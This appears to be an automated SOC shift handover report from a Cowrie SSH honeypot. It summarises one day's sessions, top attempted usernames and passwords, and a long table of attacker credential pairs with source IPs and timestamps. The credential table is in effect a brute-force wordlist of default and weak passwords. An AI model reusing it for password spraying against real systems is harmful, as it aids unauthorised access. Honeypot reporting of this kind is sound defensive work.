# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-28 |
| **Generated At** | 2026-07-28T10:40:23Z |
| **Shift Time** | 10:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **677** |
| Confirmed Threats | **653** |
| False Positives Filtered | **24** (3.5%) |
| Unique Attacker IPs | **162** |
| Countries of Origin | **42** |
| High Severity Cases | **399** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **278** |
| Malware Samples Analyzed | **3** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **439** |
| Unique Credential Pairs | **330** |
| Unique Usernames | **275** |
| Unique Passwords | **244** |
| Successful Auth Pairs | **402** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `support` | 32 |
| `root` | 15 |
| `guest` | 14 |
| `centos` | 11 |
| `mysql` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 28 |
| `6666666` | 6 |
| `0000000` | 6 |
| `7777777` | 5 |
| `rajvir123` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 27 |
| `test` | `6666666` | 6 |
| `guest` | `0000000` | 6 |
| `support` | `7777777` | 5 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `SJ14` | `0000` | `91.92.47.208` | 2026-07-28T04:55:03 |
| `info` | `1qazXSW@` | `91.92.47.208` | 2026-07-28T04:55:08 |
| `boba_fett` | `hduser` | `91.92.47.208` | 2026-07-28T04:55:13 |
| `rabbitmq` | `bigdata` | `91.92.47.208` | 2026-07-28T04:55:18 |
| `pey17` | `dolphinscheduler` | `91.92.47.208` | 2026-07-28T04:55:23 |
| `synchpcuser` | `gns3` | `91.92.47.208` | 2026-07-28T04:55:29 |
| `keycloak` | `joel` | `91.92.47.208` | 2026-07-28T04:55:34 |
| `amrita` | `741852963` | `91.92.47.208` | 2026-07-28T04:55:39 |
| `zhanghong` | `gd` | `91.92.47.208` | 2026-07-28T04:55:44 |
| `kunshiroot` | `elastic` | `91.92.47.208` | 2026-07-28T04:55:50 |
| `nobody` | `444` | `201.28.237.90` | 2026-07-28T04:55:50 |
| `us5` | `teamspeak` | `91.92.47.208` | 2026-07-28T04:55:56 |
| `ser` | `developer` | `91.92.47.208` | 2026-07-28T04:56:01 |
| `gmodserver` | `!qaz@WSX` | `91.92.47.208` | 2026-07-28T04:56:07 |
| `ntfy` | `ts` | `91.92.47.208` | 2026-07-28T04:56:12 |
| `hiddify-cli` | `ghost` | `91.92.47.208` | 2026-07-28T04:56:18 |
| `first` | `1qaz2wsx` | `91.92.47.208` | 2026-07-28T04:56:24 |
| `systemd` | `odoo` | `91.92.47.208` | 2026-07-28T04:56:30 |
| `vnc` | `claude` | `91.92.47.208` | 2026-07-28T04:56:37 |
| `gernot` | `kipt` | `91.92.47.208` | 2026-07-28T04:56:45 |
| `吴兆飞` | `!Q@W3e4r` | `91.92.47.208` | 2026-07-28T04:56:52 |
| `chendanping` | `vm` | `91.92.47.208` | 2026-07-28T04:56:58 |
| `a1marcos` | `passw0rd` | `91.92.47.208` | 2026-07-28T04:57:04 |
| `support` | `support` | `10.0.0.73` | 2026-07-28T04:57:05 |
| `user03` | `omm` | `91.92.47.208` | 2026-07-28T04:57:11 |
| `prs` | `passwd` | `91.92.47.208` | 2026-07-28T04:57:16 |
| `s10vincen` | `1234qwer` | `91.92.47.208` | 2026-07-28T04:57:22 |
| `terry` | `toor` | `91.92.47.208` | 2026-07-28T04:57:28 |
| `test` | `Changeme_123` | `91.92.47.208` | 2026-07-28T04:57:33 |
| `akian` | `sadmin` | `91.92.47.208` | 2026-07-28T04:57:39 |
| `ggonzalez` | `jenkins` | `91.92.47.208` | 2026-07-28T04:57:44 |
| `support` | `7777777` | `190.90.79.29` | 2026-07-28T04:57:45 |
| `chewbacca` | `kafka` | `91.92.47.208` | 2026-07-28T04:57:51 |
| `support` | `7777777` | `123.52.202.92` | 2026-07-28T04:57:53 |
| `sachin` | `runner` | `91.92.47.208` | 2026-07-28T04:57:57 |
| `kailin` | `guest123` | `91.92.47.208` | 2026-07-28T04:58:02 |
| `ahmed` | `rajvir123` | `91.92.47.208` | 2026-07-28T04:58:09 |
| `vlad` | `P@ssw0rd123` | `91.92.47.208` | 2026-07-28T04:58:15 |
| `shalini` | `pi` | `91.92.47.208` | 2026-07-28T04:58:20 |
| `s10ritchy` | `teamspeak` | `91.92.47.208` | 2026-07-28T04:58:25 |
| `mattermost` | `abc123` | `91.92.47.208` | 2026-07-28T04:58:32 |
| `mvint` | `qq123456` | `91.92.47.208` | 2026-07-28T04:58:38 |
| `ems` | `user2` | `91.92.47.208` | 2026-07-28T04:58:44 |
| `dbadmin` | `102030` | `91.92.47.208` | 2026-07-28T04:58:50 |
| `ftpadmin` | `admin123456` | `91.92.47.208` | 2026-07-28T04:58:56 |
| `it` | `elasticsearch` | `91.92.47.208` | 2026-07-28T04:59:03 |
| `calc` | `Aa1234567890` | `91.92.47.208` | 2026-07-28T04:59:09 |
| `mitchell` | `nginx` | `91.92.47.208` | 2026-07-28T04:59:16 |
| `s10djan` | `root12345` | `91.92.47.208` | 2026-07-28T04:59:22 |
| `weipengfei` | `cloud` | `91.92.47.208` | 2026-07-28T04:59:27 |
| `koma` | `david` | `91.92.47.208` | 2026-07-28T04:59:33 |
| `joe` | `sam` | `91.92.47.208` | 2026-07-28T04:59:39 |
| `git` | `1qaz2wsx` | `91.92.47.208` | 2026-07-28T04:59:45 |
| `rezvani` | `claude123` | `91.92.47.208` | 2026-07-28T04:59:53 |
| `noc` | `Pass@123` | `91.92.47.208` | 2026-07-28T04:59:59 |
| `shadow` | `dspace` | `91.92.47.208` | 2026-07-28T05:00:05 |
| `whbadmin` | `app` | `91.92.47.208` | 2026-07-28T05:00:10 |
| `a54188` | `asd123` | `91.92.47.208` | 2026-07-28T05:00:17 |
| `5908` | `alex` | `91.92.47.208` | 2026-07-28T05:00:23 |
| `shenzhenlianjun` | `reza` | `91.92.47.208` | 2026-07-28T05:00:30 |
| `us53` | `bob` | `91.92.47.208` | 2026-07-28T05:00:37 |
| `soladium` | `postgres` | `91.92.47.208` | 2026-07-28T05:00:43 |
| `mortezamehrzad` | `devuser` | `91.92.47.208` | 2026-07-28T05:00:49 |
| `packer` | `gg` | `91.92.47.208` | 2026-07-28T05:00:57 |
| `frappe-user` | `123qwe!@` | `91.92.47.208` | 2026-07-28T05:01:04 |
| `docker` | `1Q2w3e4r` | `91.92.47.208` | 2026-07-28T05:01:10 |
| `support` | `7777777` | `116.72.9.151` | 2026-07-28T05:01:14 |
| `dbuser` | `testuser` | `91.92.47.208` | 2026-07-28T05:01:17 |
| `user37` | `drcomadmin123` | `91.92.47.208` | 2026-07-28T05:01:22 |
| `support` | `7777777` | `117.223.152.69` | 2026-07-28T05:01:26 |
| `sally` | `ivan` | `91.92.47.208` | 2026-07-28T05:01:28 |
| `factorio` | `rajvir123` | `91.92.47.208` | 2026-07-28T05:01:34 |
| `support` | `7777777` | `10.0.0.73` | 2026-07-28T05:01:38 |
| `janlon` | `fahmi` | `91.92.47.208` | 2026-07-28T05:01:40 |
| `thomas` | `usuario` | `91.92.47.208` | 2026-07-28T05:01:46 |
| `hy` | `rdpuser` | `91.92.47.208` | 2026-07-28T05:01:51 |
| `syslog` | `admin1234` | `91.92.47.208` | 2026-07-28T05:01:58 |
| `eagle11bench20` | `nPSpP4PBW0` | `91.92.47.208` | 2026-07-28T05:02:04 |
| `starry` | `test123` | `91.92.47.208` | 2026-07-28T05:02:11 |
| `user28` | `support` | `91.92.47.208` | 2026-07-28T05:02:16 |
| `gpuadmin` | `server` | `91.92.47.208` | 2026-07-28T05:02:24 |
| `admins` | `123qwe!@` | `91.92.47.208` | 2026-07-28T05:02:29 |
| `gg` | `splunk` | `91.92.47.208` | 2026-07-28T05:02:35 |
| `ben` | `customer` | `91.92.47.208` | 2026-07-28T05:02:40 |
| `machangshuai` | `guest123` | `91.92.47.208` | 2026-07-28T05:02:47 |
| `pey12` | `P@ssw0rd123` | `91.92.47.208` | 2026-07-28T05:02:53 |
| `SJ19` | `developer` | `91.92.47.208` | 2026-07-28T05:02:58 |
| `screenshot` | `grid` | `91.92.47.208` | 2026-07-28T05:03:02 |
| `kv` | `neptune` | `91.92.47.208` | 2026-07-28T05:03:07 |
| `rahul` | `g` | `91.92.47.208` | 2026-07-28T05:03:13 |
| `xuzhipeng` | `ZAQ!2wsx` | `91.92.47.208` | 2026-07-28T05:03:19 |
| `administrator` | `admin` | `91.92.47.208` | 2026-07-28T05:03:23 |
| `guest` | `ftpuser` | `91.92.47.208` | 2026-07-28T05:03:28 |
| `a1michael` | `qwer1234` | `91.92.47.208` | 2026-07-28T05:03:33 |
| `testuser2` | `dspace` | `91.92.47.208` | 2026-07-28T05:03:40 |
| `secadmin` | `ftp` | `91.92.47.208` | 2026-07-28T05:03:45 |
| `mattermost` | `000000` | `91.92.47.208` | 2026-07-28T05:03:50 |
| `cms` | `steam123` | `91.92.47.208` | 2026-07-28T05:03:57 |
| `sadmin` | `fastuser` | `91.92.47.208` | 2026-07-28T05:04:02 |
| `kishore` | `odoo17` | `91.92.47.208` | 2026-07-28T05:04:09 |
| `server2` | `P@ssword` | `91.92.47.208` | 2026-07-28T05:04:14 |
| `support1` | `oscar123` | `91.92.47.208` | 2026-07-28T05:04:21 |
| `vguntaka` | `sftpuser` | `91.92.47.208` | 2026-07-28T05:04:27 |
| `ansadmin` | `weblogic` | `91.92.47.208` | 2026-07-28T05:04:33 |
| `jellyfin` | `media` | `91.92.47.208` | 2026-07-28T05:04:39 |
| `pankaj` | `trader` | `91.92.47.208` | 2026-07-28T05:04:46 |
| `a1marcos` | `master` | `91.92.47.208` | 2026-07-28T05:04:52 |
| `us60` | `kipt` | `91.92.47.208` | 2026-07-28T05:04:58 |
| `pufferpanel` | `angel` | `91.92.47.208` | 2026-07-28T05:05:04 |
| `raghu` | `1qaz@wsx` | `91.92.47.208` | 2026-07-28T05:05:10 |
| `mohammadjafa` | `cw` | `91.92.47.208` | 2026-07-28T05:05:16 |
| `openeuler` | `git` | `91.92.47.208` | 2026-07-28T05:05:22 |
| `first` | `prefect` | `91.92.47.208` | 2026-07-28T05:05:29 |
| `valheim` | `phuvanduc` | `91.92.47.208` | 2026-07-28T05:05:35 |
| `jasdeep` | `docker` | `91.92.47.208` | 2026-07-28T05:05:42 |
| `ricardo` | `admin2` | `91.92.47.208` | 2026-07-28T05:05:47 |
| `user28` | `admin@123` | `91.92.47.208` | 2026-07-28T05:05:52 |
| `db2inst1` | `drcomadmin123` | `91.92.47.208` | 2026-07-28T05:05:58 |
| `whbhelper` | `ubuntu` | `91.92.47.208` | 2026-07-28T05:06:03 |
| `gemma` | `123@@@` | `91.92.47.208` | 2026-07-28T05:06:09 |
| `user19` | `media` | `91.92.47.208` | 2026-07-28T05:06:14 |
| `rohit` | `guest` | `91.92.47.208` | 2026-07-28T05:06:21 |
| `telnet` | `root@123` | `91.92.47.208` | 2026-07-28T05:06:26 |
| `Patrick` | `Qwerty123` | `91.92.47.208` | 2026-07-28T05:06:32 |
| `apache` | `ftp123` | `91.92.47.208` | 2026-07-28T05:06:38 |
| `support` | `support` | `176.53.159.196` | 2026-07-28T05:06:41 |
| `mcadmin` | `elasticsearch` | `91.92.47.208` | 2026-07-28T05:06:44 |
| `nobody` | `qwer1234` | `183.233.85.194` | 2026-07-28T05:06:46 |
| `Myppn` | `kali` | `91.92.47.208` | 2026-07-28T05:06:51 |
| `ecs-user` | `elk@123` | `91.92.47.208` | 2026-07-28T05:06:57 |
| `s5duplex` | `admin@123` | `91.92.47.208` | 2026-07-28T05:07:04 |
| `applmgr` | `rajvir123` | `91.92.47.208` | 2026-07-28T05:07:09 |
| `SJ16` | `private` | `91.92.47.208` | 2026-07-28T05:07:16 |
| `bin` | `123123123` | `91.92.47.208` | 2026-07-28T05:07:23 |
| `bash` | `123123` | `91.92.47.208` | 2026-07-28T05:07:30 |
| `alice` | `000000` | `91.92.47.208` | 2026-07-28T05:07:35 |
| `tianshanshan` | `elastic` | `91.92.47.208` | 2026-07-28T05:07:41 |
| `wangqi` | `111` | `91.92.47.208` | 2026-07-28T05:07:46 |
| `almalinux` | `123321` | `91.92.47.208` | 2026-07-28T05:07:54 |
| `diana.castro` | `1029384756` | `91.92.47.208` | 2026-07-28T05:08:00 |
| `имени` | `1` | `91.92.47.208` | 2026-07-28T05:08:06 |
| `deepak` | `ec2-user` | `91.92.47.208` | 2026-07-28T05:08:11 |
| `sunil` | `deploy` | `91.92.47.208` | 2026-07-28T05:08:15 |
| `gl05` | `qq123456` | `91.92.47.208` | 2026-07-28T05:08:21 |
| `roman` | `adminuser` | `91.92.47.208` | 2026-07-28T05:08:27 |
| `hajar` | `grid` | `91.92.47.208` | 2026-07-28T05:08:33 |
| `system1` | `appuser` | `91.92.47.208` | 2026-07-28T05:08:39 |
| `hamed2` | `odoo18` | `91.92.47.208` | 2026-07-28T05:08:45 |
| `gl05` | `ftpuser` | `91.92.47.208` | 2026-07-28T05:08:51 |
| `gg` | `guest` | `91.92.47.208` | 2026-07-28T05:08:57 |
| `arash` | `amir` | `91.92.47.208` | 2026-07-28T05:09:03 |
| `azureadmin` | `guest` | `91.92.47.208` | 2026-07-28T05:09:09 |
| `hosting` | `dspace` | `91.92.47.208` | 2026-07-28T05:09:15 |
| `joel` | `!Q2w3e4r` | `91.92.47.208` | 2026-07-28T05:09:23 |
| `aporaudio` | `reza` | `91.92.47.208` | 2026-07-28T05:09:29 |
| `risc_gen_pj` | `zimbra` | `91.92.47.208` | 2026-07-28T05:09:35 |
| `gl08` | `grid` | `91.92.47.208` | 2026-07-28T05:09:41 |
| `5933` | `rock` | `91.92.47.208` | 2026-07-28T05:09:47 |
| `nobody` | `qwer1234` | `103.103.53.44` | 2026-07-28T05:09:52 |
| `s7madeline` | `system` | `91.92.47.208` | 2026-07-28T05:09:53 |
| `tech` | `tomcat` | `91.92.47.208` | 2026-07-28T05:09:59 |
| `us48` | `root123` | `91.92.47.208` | 2026-07-28T05:10:05 |
| `ftptest` | `g` | `91.92.47.208` | 2026-07-28T05:10:11 |
| `nobody` | `qwer1234` | `10.0.0.73` | 2026-07-28T05:10:15 |
| `us17` | `arthur` | `91.92.47.208` | 2026-07-28T05:10:18 |
| `jerry` | `12345` | `91.92.47.208` | 2026-07-28T05:10:23 |
| `sanam` | `111111` | `91.92.47.208` | 2026-07-28T05:10:30 |
| `jfletcher` | `t0talc0ntr0l4!` | `91.92.47.208` | 2026-07-28T05:10:36 |
| `sftp_user` | `localhost` | `91.92.47.208` | 2026-07-28T05:10:42 |
| `user5` | `123321` | `91.92.47.208` | 2026-07-28T05:10:48 |
| `mapred` | `1234` | `91.92.47.208` | 2026-07-28T05:10:55 |
| `daonkt` | `Root@123` | `91.92.47.208` | 2026-07-28T05:11:01 |
| `kunshiroot` | `ftpuser` | `91.92.47.208` | 2026-07-28T05:11:08 |
| `sbeliakou` | `appuser` | `91.92.47.208` | 2026-07-28T05:11:15 |
| `weipengfei` | `test1234` | `91.92.47.208` | 2026-07-28T05:11:20 |
| `neptune` | `sadmin` | `91.92.47.208` | 2026-07-28T05:11:26 |
| `xeno` | `!QAZ2wsx` | `91.92.47.208` | 2026-07-28T05:11:32 |
| `nxautomation` | `hello123` | `91.92.47.208` | 2026-07-28T05:11:40 |
| `jetdocumentv_usr` | `nPSpP4PBW0` | `91.92.47.208` | 2026-07-28T05:11:46 |
| `loom` | `student` | `91.92.47.208` | 2026-07-28T05:11:53 |
| `arman` | `ghost` | `91.92.47.208` | 2026-07-28T05:12:03 |
| `jimmy` | `wizard` | `91.92.47.208` | 2026-07-28T05:12:07 |
| `hysteria` | `almalinux` | `91.92.47.208` | 2026-07-28T05:12:13 |
| `customer` | `a123456A` | `91.92.47.208` | 2026-07-28T05:12:20 |
| `charlie` | `teste` | `91.92.47.208` | 2026-07-28T05:12:24 |
| `root` | `111` | `77.90.185.20` | 2026-07-28T05:12:28 |
| `s8jerry` | `ranga` | `91.92.47.208` | 2026-07-28T05:12:29 |
| `user19` | `rajvir123` | `91.92.47.208` | 2026-07-28T05:12:36 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.77.158` | 2026-07-28T05:12:39 |
| `wetdryworld` | `prefect` | `91.92.47.208` | 2026-07-28T05:12:42 |
| `spy` | `!QAZ2wsx3edc` | `91.92.47.208` | 2026-07-28T05:12:47 |
| `*1` | `$4` | `34.156.77.158` | 2026-07-28T05:12:48 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2053` | `34.156.77.158` | 2026-07-28T05:12:50 |
| `tunnel` | `ftp123` | `91.92.47.208` | 2026-07-28T05:12:54 |
| `chenxue` | `Root@123` | `91.92.47.208` | 2026-07-28T05:12:59 |
| `caoanqi` | `dmdba` | `91.92.47.208` | 2026-07-28T05:13:07 |
| `s10fmj` | `a` | `91.92.47.208` | 2026-07-28T05:13:13 |
| `rajvir` | `clawdbot` | `91.92.47.208` | 2026-07-28T05:13:18 |
| `hassanjawaiddts9` | `Huawei123` | `91.92.47.208` | 2026-07-28T05:13:25 |
| `escritorio` | `Aa123456.` | `91.92.47.208` | 2026-07-28T05:13:29 |
| `user36` | `gary` | `91.92.47.208` | 2026-07-28T05:13:36 |
| `ggaravito` | `qwe123!@` | `91.92.47.208` | 2026-07-28T05:13:39 |
| `giacomo` | `Ab123456` | `91.92.47.208` | 2026-07-28T05:13:44 |
| `testing` | `erp` | `91.92.47.208` | 2026-07-28T05:13:50 |
| `webapp` | `Password@123` | `91.92.47.208` | 2026-07-28T05:13:56 |
| `a1babette` | `111` | `91.92.47.208` | 2026-07-28T05:14:00 |
| `soft` | `playground` | `91.92.47.208` | 2026-07-28T05:14:07 |
| `s8jacintha` | `dev` | `91.92.47.208` | 2026-07-28T05:14:12 |
| `games` | `www` | `91.92.47.208` | 2026-07-28T05:14:19 |
| `hanliangheng` | `odoo` | `91.92.47.208` | 2026-07-28T05:14:27 |
| `sangoma` | `pass` | `91.92.47.208` | 2026-07-28T05:14:33 |
| `jay` | `1qaz2wsx` | `91.92.47.208` | 2026-07-28T05:14:39 |
| `s10baffour` | `nPSpP4PBW0` | `91.92.47.208` | 2026-07-28T05:14:45 |
| `sandeep` | `username` | `91.92.47.208` | 2026-07-28T05:14:52 |
| `vscode` | `bigdata` | `91.92.47.208` | 2026-07-28T05:14:57 |
| `fer` | `0` | `91.92.47.208` | 2026-07-28T05:15:03 |
| `s10emmanuel` | `user2` | `91.92.47.208` | 2026-07-28T05:15:10 |
| `xiongyinxiang` | `aA123456` | `91.92.47.208` | 2026-07-28T05:15:15 |
| `binusr` | `app` | `91.92.47.208` | 2026-07-28T05:15:21 |
| `ts3` | `qwerty` | `91.92.47.208` | 2026-07-28T05:15:28 |
| `smtest` | `1234567890` | `91.92.47.208` | 2026-07-28T05:15:34 |
| `skletsov` | `zaq12wsx` | `91.92.47.208` | 2026-07-28T05:15:40 |
| `wuxidelixin` | `flask` | `91.92.47.208` | 2026-07-28T05:15:45 |
| `angel` | `test!@` | `91.92.47.208` | 2026-07-28T05:15:51 |
| `svutukuri` | `123123123` | `91.92.47.208` | 2026-07-28T05:15:55 |
| `milad` | `labuser` | `91.92.47.208` | 2026-07-28T05:16:01 |
| `easyai` | `admin123456` | `91.92.47.208` | 2026-07-28T05:16:05 |
| `arman` | `asd123` | `91.92.47.208` | 2026-07-28T05:16:11 |
| `hamed2` | `azureuser` | `91.92.47.208` | 2026-07-28T05:16:17 |
| `shubham` | `0` | `91.92.47.208` | 2026-07-28T05:16:24 |
| `sandeep` | `ghost` | `91.92.47.208` | 2026-07-28T05:16:30 |
| `Anna` | `root1234` | `91.92.47.208` | 2026-07-28T05:16:36 |
| `podman` | `admin` | `91.92.47.208` | 2026-07-28T05:16:43 |
| `router` | `abc123` | `91.92.47.208` | 2026-07-28T05:16:48 |
| `unl0` | `crafty` | `91.92.47.208` | 2026-07-28T05:16:54 |
| `gmod` | `LeitboGi0ro` | `91.92.47.208` | 2026-07-28T05:17:01 |
| `devops` | `dspace` | `91.92.47.208` | 2026-07-28T05:17:07 |
| `tbds` | `Password@123` | `91.92.47.208` | 2026-07-28T05:17:13 |
| `monitoring` | `app` | `91.92.47.208` | 2026-07-28T05:17:19 |
| `s10arrnaud` | `super` | `91.92.47.208` | 2026-07-28T05:17:25 |
| `daonkt` | `esearch` | `91.92.47.208` | 2026-07-28T05:17:31 |
| `whbadmin` | `airflow` | `91.92.47.208` | 2026-07-28T05:17:38 |
| `pey20` | `root1` | `91.92.47.208` | 2026-07-28T05:17:43 |
| `horiz` | `nginx` | `91.92.47.208` | 2026-07-28T05:17:49 |
| `a1samka` | `test@123` | `91.92.47.208` | 2026-07-28T05:17:54 |
| `appuser` | `root@2026` | `91.92.47.208` | 2026-07-28T05:18:00 |
| `mattermost` | `gns3` | `91.92.47.208` | 2026-07-28T05:18:05 |
| `webapp` | `ranger` | `91.92.47.208` | 2026-07-28T05:18:11 |
| `riyuexinbandaoti` | `tomcat` | `91.92.47.208` | 2026-07-28T05:18:16 |
| `tinyproxy` | `data` | `91.92.47.208` | 2026-07-28T05:18:23 |
| `u2612` | `playground` | `91.92.47.208` | 2026-07-28T05:18:29 |
| `orpak` | `factorio` | `91.92.47.208` | 2026-07-28T05:18:36 |
| `ftpuser1` | `tom` | `91.92.47.208` | 2026-07-28T05:18:41 |
| `sysupdate` | `ranga` | `91.92.47.208` | 2026-07-28T05:18:47 |
| `emqttd` | `almalinux` | `91.92.47.208` | 2026-07-28T05:18:53 |
| `SJ17` | `!QAZ2wsx` | `91.92.47.208` | 2026-07-28T05:19:00 |
| `us33` | `0` | `91.92.47.208` | 2026-07-28T05:19:06 |
| `s10roland` | `!QAZ2wsx` | `91.92.47.208` | 2026-07-28T05:19:12 |
| `a1fleur` | `es123456` | `91.92.47.208` | 2026-07-28T05:19:17 |
| `max` | `raspberry` | `91.92.47.208` | 2026-07-28T05:19:23 |
| `ben` | `a` | `91.92.47.208` | 2026-07-28T05:19:30 |
| `vmadmin` | `david` | `91.92.47.208` | 2026-07-28T05:19:35 |
| `us39` | `1qaz@WSX3edc` | `91.92.47.208` | 2026-07-28T05:19:41 |
| `secscan` | `test123` | `91.92.47.208` | 2026-07-28T05:19:48 |
| `s10femi` | `rajvir123` | `91.92.47.208` | 2026-07-28T05:19:53 |
| `sk` | `almalinux` | `91.92.47.208` | 2026-07-28T05:19:59 |
| `s9aziza` | `erpnext` | `91.92.47.208` | 2026-07-28T05:20:05 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-28T05:20:11 |
| `liberty-bridge` | `password` | `91.92.47.208` | 2026-07-28T05:20:12 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-28T05:20:12 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-28T05:20:19 |
| `mma` | `Admin123` | `91.92.47.208` | 2026-07-28T05:20:19 |
| `guest` | `11111` | `61.12.86.90` | 2026-07-28T05:20:23 |
| `global` | `frappe123` | `91.92.47.208` | 2026-07-28T05:20:27 |
| `vilichev` | `orca` | `91.92.47.208` | 2026-07-28T05:20:32 |
| `guest` | `11111` | `213.130.207.177` | 2026-07-28T05:20:35 |
| `sufeel` | `ts` | `91.92.47.208` | 2026-07-28T05:20:37 |
| `us52` | `nobody` | `91.92.47.208` | 2026-07-28T05:20:43 |
| `gl09` | `P@ssword` | `91.92.47.208` | 2026-07-28T05:20:50 |
| `chenxue` | `media` | `91.92.47.208` | 2026-07-28T05:20:56 |
| `hussein` | `Password@123` | `91.92.47.208` | 2026-07-28T05:21:03 |
| `user28` | `amir` | `91.92.47.208` | 2026-07-28T05:21:09 |
| `rezvani` | `wso2` | `91.92.47.208` | 2026-07-28T05:21:15 |
| `elasticsearch` | `ai` | `91.92.47.208` | 2026-07-28T05:21:21 |
| `YS04` | `ftpuser123` | `91.92.47.208` | 2026-07-28T05:21:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.24` | 2026-07-28T05:21:29 |
| `test1` | `alex` | `91.92.47.208` | 2026-07-28T05:21:32 |
| `chenweijun` | `Tiki2025@!` | `91.92.47.208` | 2026-07-28T05:21:38 |
| `tbds` | `default` | `91.92.47.208` | 2026-07-28T05:21:45 |
| `frappe-user` | `Password` | `91.92.47.208` | 2026-07-28T05:21:50 |
| `debug` | `!qaz@WSX` | `91.92.47.208` | 2026-07-28T05:21:56 |
| `mobiquity` | `Aa123321` | `91.92.47.208` | 2026-07-28T05:22:03 |
| `g` | `oscar` | `91.92.47.208` | 2026-07-28T05:22:09 |
| `s8abimbola` | `mohammad` | `91.92.47.208` | 2026-07-28T05:22:15 |
| `unknown` | `33` | `182.151.45.136` | 2026-07-28T05:22:18 |
| `noctvm` | `bob` | `91.92.47.208` | 2026-07-28T05:22:22 |
| `gitea` | `12qwaszx` | `91.92.47.208` | 2026-07-28T05:22:28 |
| `update` | `mohammad` | `91.92.47.208` | 2026-07-28T05:22:34 |
| `guest` | `11111` | `197.242.170.10` | 2026-07-28T05:23:33 |
| `guest` | `11111` | `222.86.168.224` | 2026-07-28T05:23:43 |
| `unknown` | `33` | `10.0.0.73` | 2026-07-28T05:25:59 |
| `admin` | `P@ssw0rd@2023` | `152.32.212.226` | 2026-07-28T05:27:27 |
| `345gs5662d34` | `345gs5662d34` | `152.32.212.226` | 2026-07-28T05:27:31 |
| `admin` | `3245gs5662d34` | `152.32.212.226` | 2026-07-28T05:27:32 |
| `unknown` | `3333333` | `46.201.247.21` | 2026-07-28T05:34:31 |
| `unknown` | `3333333` | `10.0.0.73` | 2026-07-28T05:34:52 |
| `blank` | `blank555` | `220.178.246.43` | 2026-07-28T05:44:43 |
| `blank` | `blank555` | `65.20.134.97` | 2026-07-28T05:44:55 |
| `root` | `﻿------fuck------` | `169.58.4.219` | 2026-07-28T05:47:50 |
| `administrator` | `0987654321` | `50.217.40.11` | 2026-07-28T05:50:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.14.36.213` | 2026-07-28T05:56:26 |
| `*1` | `$4` | `34.14.36.213` | 2026-07-28T05:56:39 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5373` | `34.14.36.213` | 2026-07-28T05:56:41 |
| `centos` | `qwerty12345` | `10.0.0.73` | 2026-07-28T05:59:22 |
| `mysql` | `maintenance` | `196.190.180.18` | 2026-07-28T06:09:12 |
| `mysql` | `maintenance` | `62.201.212.54` | 2026-07-28T06:09:19 |
| `mysql` | `maintenance` | `20.46.45.121` | 2026-07-28T06:12:29 |
| `mysql` | `maintenance` | `80.233.12.109` | 2026-07-28T06:12:40 |
| `mysql` | `maintenance` | `10.0.0.73` | 2026-07-28T06:12:53 |
| `guest` | `guest444` | `179.181.133.153` | 2026-07-28T06:14:50 |
| `guest` | `guest444` | `220.178.246.43` | 2026-07-28T06:15:01 |
| `guest` | `guest444` | `10.0.0.73` | 2026-07-28T06:15:13 |
| `user` | `2222222` | `101.13.1.58` | 2026-07-28T06:20:10 |
| `user` | `2222222` | `213.230.64.246` | 2026-07-28T06:20:22 |
| `user` | `2222222` | `10.0.0.73` | 2026-07-28T06:23:54 |
| `centos` | `33333` | `31.173.29.136` | 2026-07-28T06:33:43 |
| `ubnt` | `4444444` | `196.219.93.108` | 2026-07-28T06:35:46 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.33.12.122` | 2026-07-28T06:36:51 |
| `centos` | `33333` | `10.0.0.73` | 2026-07-28T06:37:28 |
| `centos` | `159753` | `220.178.39.106` | 2026-07-28T06:44:47 |
| `centos` | `159753` | `136.185.6.181` | 2026-07-28T06:44:56 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-28T06:46:12 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-28T06:46:12 |
| `centos` | `159753` | `211.253.10.61` | 2026-07-28T06:48:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.105.128.11` | 2026-07-28T06:49:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.155.76.11` | 2026-07-28T06:53:03 |
| `*1` | `$4` | `104.155.76.11` | 2026-07-28T06:53:17 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2830` | `104.155.76.11` | 2026-07-28T06:53:19 |
| `test` | `6666666` | `125.19.244.62` | 2026-07-28T07:00:23 |
| `test` | `6666666` | `41.224.62.206` | 2026-07-28T07:00:34 |
| `operator` | `operator555` | `211.169.212.206` | 2026-07-28T07:01:29 |
| `operator` | `operator555` | `111.70.32.53` | 2026-07-28T07:01:38 |
| `operator` | `operator555` | `10.0.0.73` | 2026-07-28T07:01:51 |
| `test` | `6666666` | `182.156.80.11` | 2026-07-28T07:03:44 |
| `test` | `6666666` | `121.159.71.249` | 2026-07-28T07:03:52 |
| `test` | `6666666` | `10.0.0.73` | 2026-07-28T07:04:07 |
| `admin` | `1111111` | `180.151.254.218` | 2026-07-28T07:09:09 |
| `admin` | `1111111` | `191.210.73.33` | 2026-07-28T07:09:17 |
| `admin` | `1111111` | `10.0.0.73` | 2026-07-28T07:13:09 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-28T07:18:53 |
